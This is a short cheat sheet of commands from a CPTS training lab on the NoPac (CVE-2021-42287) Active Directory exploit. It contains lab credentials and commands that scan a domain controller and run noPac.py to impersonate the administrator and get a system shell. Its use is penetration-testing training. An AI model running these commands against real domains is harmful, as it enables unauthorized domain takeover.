# NoPac / Sam-the-admin

% nopac, cve-2021-42287, cpts

## NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - scanning-for-nopac
#cat/ATTACK/EXPLOIT #cpts
```
[!bash!]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

## NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - running-nopac-getting-a-shell
#cat/ATTACK/EXPLOIT #cpts
```
[!bash!]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

## NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - confirming-the-location-of-saved-tickets
#cat/ATTACK/EXPLOIT #cpts
```
[!bash!]$ ls
```

## NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - apply-what-was-taught-in-this-section-to-gain-a-shell-on-dc01-submit-t
#cat/ATTACK/EXPLOIT #cpts
Students need to change directories to `/opt/noPac` and then run the `noPac` exploit to gain a system shell:

```
cd /opt/noPac/
```

## NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - apply-what-was-taught-in-this-section-to-gain-a-shell-on-dc01-submit-t-2
#cat/ATTACK/EXPLOIT #cpts
Students need to change directories to `/opt/noPac` and then run the `noPac` exploit to gain a system shell:

```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

## NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - NoPac / Sam-the-admin - apply-what-was-taught-in-this-section-to-gain-a-shell-on-dc01-submit-t-3
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ $sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

